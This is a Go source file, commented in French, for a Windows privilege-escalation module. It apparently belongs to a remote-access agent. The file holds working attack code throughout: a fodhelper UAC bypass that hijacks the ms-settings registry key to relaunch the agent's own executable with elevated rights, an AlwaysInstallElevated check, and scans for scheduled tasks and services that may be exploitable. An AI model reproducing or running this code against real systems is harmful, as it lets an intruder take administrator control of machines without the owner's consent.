//go:build windows
// +build windows

package commands

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// Vérifie si on est administrateur
func IsAdmin() bool {
	if runtime.GOOS != "windows" {
		return false
	}

	// Méthode 1: Essayer de créer un fichier dans System32
	testPath := "C:\\Windows\\System32\\test_privesc.txt"
	err := os.WriteFile(testPath, []byte("test"), 0644)
	if err == nil {
		os.Remove(testPath)
		return true // On a réussi à écrire = admin
	}

	// Méthode 2: Vérifier avec une commande
	cmd := exec.Command("net", "session")
	err = cmd.Run()
	return err == nil
}

// Méthode 1: UAC bypass via fodhelper (Windows 10/11)
func bypassUACFodhelper() (bool, string) {
	var result strings.Builder
	result.WriteString("  [>] Tentative UAC bypass via fodhelper...\r\n")

	// Clé registry à modifier
	regPath := "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command"

	// Chemin de notre executable (celui en cours)
	exePath, _ := os.Executable()

	// Créer la clé registry
	cmd1 := exec.Command("reg", "add", regPath, "/ve", "/d", exePath, "/f")
	cmd1.Run()

	cmd2 := exec.Command("reg", "add", regPath, "/v", "DelegateExecute", "/f")
	cmd2.Run()

	// Lancer fodhelper pour déclencher l'UAC bypass
	cmd3 := exec.Command("cmd", "/c", "start", "fodhelper.exe")
	cmd3.Run()

	// Attendre un peu
	result.WriteString("  [>] Attente de l'elevation...\r\n")
	time.Sleep(2 * time.Second)

	// Nettoyer
	cmd4 := exec.Command("reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f")
	cmd4.Run()

	return IsAdmin(), result.String()
}

// Méthode 2: AlwaysInstallElevated (si activé)
func checkAlwaysInstallElevated() (bool, string) {
	var result strings.Builder
	result.WriteString("  [>] Verification AlwaysInstallElevated...\r\n")

	// Vérifier les clés registry
	cmd1 := exec.Command("reg", "query", "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", "/v", "AlwaysInstallElevated")
	out1, _ := cmd1.CombinedOutput()

	cmd2 := exec.Command("reg", "query", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", "/v", "AlwaysInstallElevated")
	out2, _ := cmd2.CombinedOutput()

	if strings.Contains(string(out1), "0x1") && strings.Contains(string(out2), "0x1") {
		result.WriteString("  [+] AlwaysInstallElevated active!\r\n")
		result.WriteString("  [!] Simulation: creation d'un MSI elevateur\r\n")
		return true, result.String()
	}

	result.WriteString("  [-] AlwaysInstallElevated non active\r\n")
	return false, result.String()
}

// Méthode 3: Vérifier les tâches planifiées vulnérables
func checkScheduledTasks() string {
	var result strings.Builder
	result.WriteString("  [>] Recherche de taches planifiees vulnerables...\r\n")

	cmd := exec.Command("schtasks", "/query", "/fo", "LIST", "/v")
	output, err := cmd.CombinedOutput()

	if err != nil {
		result.WriteString("    [-] Erreur lors de la requete\r\n")
		return result.String()
	}

	lines := strings.Split(string(output), "\n")
	found := 0
	for _, line := range lines {
		if strings.Contains(line, "Task To Run:") && strings.Contains(line, "Users") {
			result.WriteString(fmt.Sprintf("    [!] Tache potentiellement vulnerable: %s\r\n", strings.TrimSpace(line)))
			found++
			if found >= 3 {
				break // Limiter l'output
			}
		}
	}

	if found == 0 {
		result.WriteString("    [+] Aucune tache vulnerable trouvee\r\n")
	}

	return result.String()
}

// Méthode 4: Vérifier les services vulnérables
func checkVulnerableServices() string {
	var result strings.Builder
	result.WriteString("  [>] Recherche de services vulnerables...\r\n")

	cmd := exec.Command("sc", "query", "state=", "all")
	output, err := cmd.CombinedOutput()

	if err != nil {
		result.WriteString("    [-] Erreur lors de la requete\r\n")
		return result.String()
	}

	services := strings.Split(string(output), "SERVICE_NAME:")
	found := 0
	for _, service := range services {
		if strings.Contains(service, "BINARY_PATH_NAME") {
			// Vérifier si un service non-système peut être modifié
			if strings.Contains(service, ":\\Program Files") {
				serviceName := strings.TrimSpace(strings.Split(service, "\n")[0])
				if serviceName != "" && found < 3 {
					result.WriteString(fmt.Sprintf("    [!] Service potentiellement modifiable: %s\r\n", serviceName))
					found++
				}
			}
		}
	}

	if found == 0 {
		result.WriteString("    [+] Aucun service vulnerable trouve\r\n")
	}

	return result.String()
}

// Fonction principale de privesc
func Privesc() string {
	var result strings.Builder

	result.WriteString("\r\n")
	result.WriteString("==========================================\r\n")
	result.WriteString("    ELEVATION DE PRIVILEGES\r\n")
	result.WriteString("==========================================\r\n")

	// 1. Vérifier si déjà admin
	if IsAdmin() {
		result.WriteString("\r\n[+] Deja administrateur !\r\n")
		result.WriteString("==========================================\r\n")
		return result.String()
	}

	result.WriteString("\r\n[!] Utilisateur standard - Tentative d'elevation...\r\n")

	// 2. Lister les infos système
	result.WriteString("\r\n[*] Informations systeme:\r\n")
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	result.WriteString(fmt.Sprintf("   Hostname: %s\r\n", hostname))
	result.WriteString(fmt.Sprintf("   Utilisateur: %s\r\n", username))
	result.WriteString(fmt.Sprintf("   OS: %s\r\n", runtime.GOOS))

	// 3. Tenter différentes méthodes
	result.WriteString("\r\n[*] Tentative des methodes d'elevation:\r\n")

	// Méthode 1: UAC bypass (fodhelper)
	result.WriteString("\r\n[>] UAC bypass (fodhelper)...\r\n")
	success, details := bypassUACFodhelper()
	result.WriteString(details)
	if success {
		result.WriteString("[+] UAC bypass (fodhelper) reussi!\r\n")
	} else {
		result.WriteString("[-] UAC bypass (fodhelper) echoue\r\n")
	}

	// Méthode 2: AlwaysInstallElevated
	result.WriteString("\r\n[>] AlwaysInstallElevated...\r\n")
	success2, details2 := checkAlwaysInstallElevated()
	result.WriteString(details2)
	if success2 {
		result.WriteString("[+] AlwaysInstallElevated reussi!\r\n")
	}

	// 4. Vérifier les vulnérabilités potentielles
	result.WriteString("\r\n[*] Scan des vulnerabilites locales:\r\n")
	result.WriteString(checkScheduledTasks())
	result.WriteString(checkVulnerableServices())

	// 5. Vérifier le résultat final
	result.WriteString("\r\n[*] Resultat final:\r\n")
	if IsAdmin() {
		result.WriteString("[+] Elevation reussie !\r\n")
		result.WriteString("    L'agent est maintenant administrateur.\r\n")
	} else {
		result.WriteString("[-] Echec de l'elevation automatique.\r\n")
		result.WriteString("    Voici des pistes manuelles:\r\n")
		result.WriteString("    - Verifier les taches planifiees listees\r\n")
		result.WriteString("    - Verifier les services listes\r\n")
		result.WriteString("    - Chercher des exploits kernel connus\r\n")
	}

	result.WriteString("\r\n==========================================\r\n")
	return result.String()
}
